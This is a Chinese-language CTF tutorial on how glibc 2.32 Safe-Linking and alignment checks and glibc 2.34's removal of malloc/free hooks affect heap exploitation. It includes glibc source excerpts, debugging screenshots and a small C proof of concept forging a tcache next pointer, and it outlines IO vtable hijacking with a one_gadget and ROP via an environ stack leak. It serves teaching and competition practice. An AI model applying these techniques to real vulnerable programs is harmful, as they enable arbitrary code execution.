## **前言**

八月，GNU发布了glibc库新版本glibc-2.34，这次版本更新带来了一些新特性，比如将libpthread、libdl等一些函数集成到了主库，添加了对64位time_t的支持等；同时修复了一些安全问题，作为一个CTF爱好者，笔者注意到了一些常用的hook符号比如malloc_hook、free_hook这些已经在新版本被移除了，这个改动影响了以往的一些漏洞利用方法。近一年来glibc发布了glibc-2.32~2.34几个版本更新，而国内外已经有一些比赛使用了glibc-2.32的环境，此篇文章将介绍glibc-2.32及glibc-2.34中对CTF
PWN影响比较大的malloc函数中的更新，旨在帮助读者了解新版本，并简单介绍几种绕过方法，重在分享思路。

## glibc-2.32

 **补丁介绍**

1\. 在glibc-2.32引入了Safe-Linking机制，应用于tcache与fastbins中，以tcache为例，查看tcache_put()函数的实现：

    
    
    static __always_inline void  
    tcache_put (mchunkptr chunk, size_t tc_idx)  
    {  
    tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  
      
    /* Mark this chunk as "in the tcache" so the test in _int_free will  
    detect a double free.  */  
    e->key = tcache;  
      
    e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);  
    tcache->entries[tc_idx] = e;  
    ++(tcache->counts[tc_idx]);  
    }

可以看到经glibc-2.32更新后，e->next不再是直接指向原来的tcache头指针，而是指向了经PROTECT_PTR处理过的指针，查看PROTECT_PTR定义：

    
    
    #define PROTECT_PTR(pos, ptr) \  
    ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))

结合tcache_put()函数可以得出e->next最终指向了e->next地址右移12位后的值与当前tcache头指针值异或的结果，这里引用Safe-Linking设计师文章[1]中的一张图描述此过程：

![1635408717_617a5b4d398ba9346341f.jpg!small?1635408717542](https://image.3001.net/images/20211028/1635408717_617a5b4d398ba9346341f.jpg!small?1635408717542)

P'即最后写入next指针的值。

接着查看tcache_get()函数：

    
    
    tcache_get (size_t tc_idx)  
      
    {  
      
    tcache_entry *e = tcache->entries[tc_idx];  
      
    if (__glibc_unlikely (!aligned_OK (e)))  
      
    malloc_printerr ("malloc(): unaligned tcache chunk detected");  
      
    tcache->entries[tc_idx] = REVEAL_PTR (e->next);  
      
    --(tcache->counts[tc_idx]);  
      
    e->key = 0;  
      
    return (void *) e;  
      
    }

可以看到在新版本下，当tcache头指针指向的内存被malloc申请出来，tcache头指针会指向REVEAL_PTR
(e->next)，REVEAL_PTR用来恢复写入tcache头指针的值，定义如下：

    
    
    #define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)    

接下来通过编写下面程序调试此过程，调试版本为glibc-2.32-0ubuntu6_amd64：

    
    
    #include <stdlib.h>  
    int main()  
    {  
    void *p1 = malloc(0x20);  
    malloc(0x1000);  
    void *p2 = malloc(0x20);  
    free(p1);  
    free(p2);  
    }

首先在free(p1)时，由于tcache此时为空，p1->next应指向(&(p1->next)>>12)^0的结果：

![1635408750_617a5b6e86a627377d1cd.jpg!small?1635408750936](https://image.3001.net/images/20211028/1635408750_617a5b6e86a627377d1cd.jpg!small?1635408750936)

free(p2)时，p2->next应等于(&(p2->next)>>12)^&p1：

![1635408776_617a5b881df3744f65b57.jpg!small?1635408776443](https://image.3001.net/images/20211028/1635408776_617a5b881df3744f65b57.jpg!small?1635408776443)

通过手动计算，即为(0x55555555c2e0>>12)^0x55555555b2a0，等于0x55500000e7fc，与调试结果一致。

2\. 此外，在glibc-2.32版本中还引入了对tcache和fastbins中申请及释放内存地址的对齐检测，以tcache_get()为例：

    
    
    static __always_inline void *  
      
    tcache_get (size_t tc_idx)  
      
    {  
      
    tcache_entry *e = tcache->entries[tc_idx];  
      
    if (__glibc_unlikely (!aligned_OK (e)))  
      
    malloc_printerr ("malloc(): unaligned tcache chunk detected");  
      
    tcache->entries[tc_idx] = REVEAL_PTR (e->next);  
      
    --(tcache->counts[tc_idx]);  
      
    e->key = NULL;  
      
    return (void *) e;  
      
    }

aligned_OK()定义为：

    
    
    #define aligned_OK(m)  (((unsigned long)(m) & MALLOC_ALIGN_MASK) == 0)  
    #define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)  
    #define MALLOC_ALIGNMENT (2 * SIZE_SZ < __alignof__ (long double) \  
    ? __alignof__ (long double) : 2 * SIZE_SZ)

可以看到内存地址需要以0x10字节对齐。

 **补丁限制**

glibc-2.32的补丁主要限制以下几种漏洞利用手法：

1\. 原有tcache poisoning、fastbin attack等通过直接覆盖chunk->next指针达到任意地址申请的利用办法

2\. 由于检测了申请地址是否以0x10对齐，fastbin
attack的利用办法受到限制，例如经典的通过错位构造"\x7f"劫持malloc_hook和IO_FILE的利用办法

 **绕过方法**

1\.
结合上述调试过程可以知道，当tcache为空时，next指针会指向next地址右移12位的值，如果能将此值泄漏出来，则可以直接使用此值与目标地址异或，覆盖next指针从而申请内存到任意地址，POC如下：

    
    
    #include <stdlib.h>  
    #include <stdint.h>  
    uint64_t target_addr = 0xdeadbeef;  
      
    int main()  
    {  
    void *p1 = malloc(0x20);  
    malloc(0x1000);  
    void *p2 = malloc(0x20);  
    free(p2);  
    uint64_t next = *(uint64_t*)p2;  
    printf("Leak next>>12 ptr: %p\n", next);  
    uint64_t fake_next = next^((uint64_t)⌖_addr);  
    printf("Fake next ptr: %p\n", fake_next);  
    p2 = malloc(0x20);  
    free(p1);  
    free(p2);  
    *(uint64_t*)p2 = fake_next;  
    malloc(0x20);  
    void *p3 = malloc(0x20);  
    *(uint64_t*)p3 = 0xcafebabe;  
    printf("Now target_addr's content is 0x%lx\n", target_addr);  
    }

2\. 由于tcache链表头指针存储的是当前释放堆地址的值，即tcache->entries[tc_idx] =
e，tcache_stashing_unlink_attack的办法依然有效。

3\.
同样因为tcache链表头指针存储的是当前释放堆地址的值，所以如果能劫持到tcache结构体内存将链表头指针修改为目标地址，即可实现申请内存到任意地址。

4\. 通过largebin的fd_nextsize或bk_nextsize来泄漏完整堆地址，可以将与目标地址异或的结果覆盖到next指针达到任意地址申请。

## glibc-2.34

 **补丁介绍**

在glibc-2.34的补丁中移除了几个hook符号：

__free_hook

__malloc_hook

__realloc_hook

__memalign_hook

__after_morecore_hook

其中我们的“老朋友”：free_hook和malloc_hook被移除了，GNU的维护者发表了文章[2]阐明了移除这些hook的原因，这意味传统的去劫持这些hook从而控制程序执行流程的方法不再适用于新版本glibc，但方法总是有的，笔者这里简单介绍一下绕过的思路。

 **绕过办法**

1\. 利用IO_vtable

在glibc-2.34中，可以看到vtable拥有可写权限，这里以stdout为例（vtable位于0xd8偏移处），调试版本为glibc-2.34-0ubuntu1_amd64：![1635408850_617a5bd293c9212345461.jpg!small?1635408850922](https://image.3001.net/images/20211028/1635408850_617a5bd293c9212345461.jpg!small?1635408850922)

查看vtable如下：

![1635408886_617a5bf6a7b7bcd3b0f69.jpg!small?1635408887104](https://image.3001.net/images/20211028/1635408886_617a5bf6a7b7bcd3b0f69.jpg!small?1635408887104)

vtable结构体定义如下：

    
    
    struct _IO_jump_t  
    {  
    JUMP_FIELD(size_t, __dummy);  
    JUMP_FIELD(size_t, __dummy2);  
    JUMP_FIELD(_IO_finish_t, __finish);  
    JUMP_FIELD(_IO_overflow_t, __overflow);  
    JUMP_FIELD(_IO_underflow_t, __underflow);  
    JUMP_FIELD(_IO_underflow_t, __uflow);  
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);  
    /* showmany */  
    JUMP_FIELD(_IO_xsputn_t, __xsputn);  
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);  
    JUMP_FIELD(_IO_seekoff_t, __seekoff);  
    JUMP_FIELD(_IO_seekpos_t, __seekpos);  
    JUMP_FIELD(_IO_setbuf_t, __setbuf);  
    JUMP_FIELD(_IO_sync_t, __sync);  
    JUMP_FIELD(_IO_doallocate_t, __doallocate);  
    JUMP_FIELD(_IO_read_t, __read);  
    JUMP_FIELD(_IO_write_t, __write);  
    JUMP_FIELD(_IO_seek_t, __seek);  
    JUMP_FIELD(_IO_close_t, __close);  
    JUMP_FIELD(_IO_stat_t, __stat);  
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);  
    JUMP_FIELD(_IO_imbue_t, __imbue);  
    };

这里的指针便是我们可以用来劫持的对象，接下来以puts函数为例，编写以下代码，尝试去发现stdout vtable中可以利用的指针。

    
    
    #include <stdlib.h>  
    #include <stdint.h>  
    int main()  
    {  
    char *p = malloc(0x100);  
    char str[] = "AAAAAAAAAAAAAAAAAAAAAA";  
    memcpy(p, str, 0x100);  
    puts("finish.");  
    puts(p);  
    }

阅读源码得知在puts函数内部先后调用了虚函数_IO_XSPUTN和_IO_OVERFLOW，这些都不太好被利用，继续跟进发现当缓冲区未被建立时，会调用虚函数_IO_DOALLOCATE：

    
    
    int  
    _IO_new_file_overflow (FILE *f, int ch)  
    {  
    ...  
    if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)  
    {  
    /* Allocate a buffer if needed. */  
    if (f->_IO_write_base == NULL)  
    {  
    _IO_doallocbuf (f);  
    ...  
    }  
    void  
    _IO_doallocbuf (FILE *fp)  
    {  
    if (fp->_IO_buf_base)  
    return;  
    if (!(fp->_flags & _IO_UNBUFFERED) || fp->_mode > 0)  
    if (_IO_DOALLOCATE (fp) != EOF)  
    return;  
    _IO_setb (fp, fp->_shortbuf, fp->_shortbuf+1, 0);  
    }

动态调试查看函数调用时的寄存器：

![1635408920_617a5c182e99e77587347.jpg!small?1635408920540](https://image.3001.net/images/20211028/1635408920_617a5c182e99e77587347.jpg!small?1635408920540)

利用one_gadget工具查看glibc-2.34中one_gadget的偏移及使用条件，发现恰巧满足rsi==0，[rdx]==0的条件：

![1635408938_617a5c2ab8a6e08e54c77.jpg!small?1635408939046](https://image.3001.net/images/20211028/1635408938_617a5c2ab8a6e08e54c77.jpg!small?1635408939046)

栈回溯如下：

    
    
    ► f 0     7ffff7e29c5d _IO_doallocbuf+77  
    f 1     7ffff7e28ef0 _IO_file_overflow+432  
    f 2     7ffff7e27685 _IO_file_xsputn+229  
    f 3     7ffff7e1cf90 puts+208

  

_IO_DOALLOCATE在缓冲区未建立时被调用，但通常情况下这个条件满足不了，故这个getshell的办法需要两步完成，首先将_IO_DOALLOCATE覆盖成满足条件的one_gadget地址，然后再将stdout结构体中缓冲区指针清空，再次调用puts时getshell。

![1635408959_617a5c3f23cc8aed06068.jpg!small?1635408959447](https://image.3001.net/images/20211028/1635408959_617a5c3f23cc8aed06068.jpg!small?1635408959447)

当然这里仅做举例说明，这个攻击链并不具备通用性，在实际使用时，要考虑当时的场景选择合适的指针进行覆盖。

2\. 利用劫持栈返回地址进行ROP

在libc中存在符号environ指向了&argv[argc +
1]的地址，这个地址保存在栈上，而environ地址可以通过libc偏移计算获得，所以如果条件允许通过泄漏environ的值获得栈地址，再通过计算并劫持栈返回地址提前布置好rop链，可以最终达到getshell的目的。

## 总结

glibc的版本更新在安全维护方面不仅仅是修复已有的漏洞，同样也消除了很多漏洞利用的方法，这无疑给漏洞利用增加了很多难度，将在CTF比赛中给选手带来更多考验，需要大家灵活运用已有方法，并能够去寻找新的利用方法。

## 参考

[1]https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/

[2]https://developers.redhat.com/articles/2021/08/25/securing-malloc-glibc-why-malloc-hooks-had-go

  

  

